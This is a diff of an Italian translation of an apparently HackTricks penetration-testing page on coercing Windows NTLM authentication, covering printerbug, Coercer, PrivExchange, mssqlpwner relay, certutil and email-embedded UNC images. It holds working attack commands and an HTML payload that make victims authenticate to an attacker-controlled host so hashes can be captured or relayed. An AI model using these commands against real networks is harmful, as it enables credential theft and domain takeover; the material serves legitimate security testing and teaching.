@@ -43,9 +43,11 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 Se un attaccante ha già compromesso un computer con [Delegazione Illimitata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante contro questo computer**. A causa della delegazione illimitata, il **TGT** dell'**account computer della stampante** sarà **salvato in** **memoria** del computer con delegazione illimitata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).
 
-## Forzare l'autenticazione RCP
+## RCP Forzare l'autenticazione
 
-{% embed url="https://github.com/p0dalirius/Coercer" %}
+{{#ref}}
+https://github.com/p0dalirius/Coercer
+{{#endref}}
 
 ## PrivExchange
 
@@ -53,9 +55,9 @@ L'attacco `PrivExchange` è il risultato di un difetto trovato nella **funzione 
 
 Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sul dominio pre-2019 Cumulative Update**). Questo difetto può essere sfruttato per abilitare il **reindirizzamento delle informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il reindirizzamento a LDAP non sia possibile, questo difetto può comunque essere utilizzato per reindirizzare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
 
-## All'interno di Windows
+## Dentro Windows
 
-Se sei già all'interno della macchina Windows, puoi forzare Windows a connettersi a un server utilizzando account privilegiati con:
+Se sei già dentro la macchina Windows, puoi forzare Windows a connettersi a un server utilizzando account privilegiati con:
 
 ### Defender MpCmdRun
 ```bash
@@ -76,6 +78,8 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
+Oppure usa quest'altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+
 ### Certutil
 
 È possibile utilizzare certutil.exe lolbin (binary firmato da Microsoft) per forzare l'autenticazione NTLM:
@@ -86,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, puoi semplicemente inviargli un'**email con un'immagine 1x1** come
+Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, potresti semplicemente inviargli un'**email con un'immagine 1x1** come
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -101,6 +105,6 @@ Se puoi eseguire un attacco MitM a un computer e iniettare HTML in una pagina ch
 ## Cracking NTLMv1
 
 Se riesci a catturare [le sfide NTLMv1 leggi qui come crackerle](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;icorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
+&#xNAN;_&#x52;ricorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
